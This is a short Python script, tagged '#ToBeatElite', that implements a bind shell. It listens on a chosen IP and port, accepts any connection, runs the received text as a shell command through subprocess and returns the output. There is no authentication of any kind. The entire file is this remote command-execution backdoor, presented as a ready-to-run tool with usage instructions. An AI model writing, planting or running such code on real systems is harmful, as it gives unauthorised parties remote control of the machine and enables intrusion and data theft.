#ToBeatElite
from threading import Thread
import subprocess
import socket
import sys

def connect_to_socket(target_ip, target_port):
    tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    tcp_server.bind((target_ip, target_port))
    tcp_server.listen(5)

    print(f"Listening on {socket.gethostname()} : {target_port}")

    while True:
        client_socket, client_address = tcp_server.accept()
        print(f"Connection from {client_address} has been Established")
        client_socket.send(bytes("Connection Established", "utf-8"))
        recieved_data = client_socket.recv(4096)

        command_output = subprocess.getoutput(recieved_data.decode("utf-8"))
        client_socket.send(bytes(command_output, "utf-8"))
        
def main():
    try:
        my_target = sys.argv[1]
        my_target_port = int(sys.argv[2])
        
        server_handler = Thread(target=connect_to_socket, args=(my_target, my_target_port))
        server_handler.start()

    except Exception as ex: print(f"\nUsage: python {sys.argv[0]} [Machine's IP] [Port to Listen on]\n{ex}") 

if __name__ == "__main__": main()
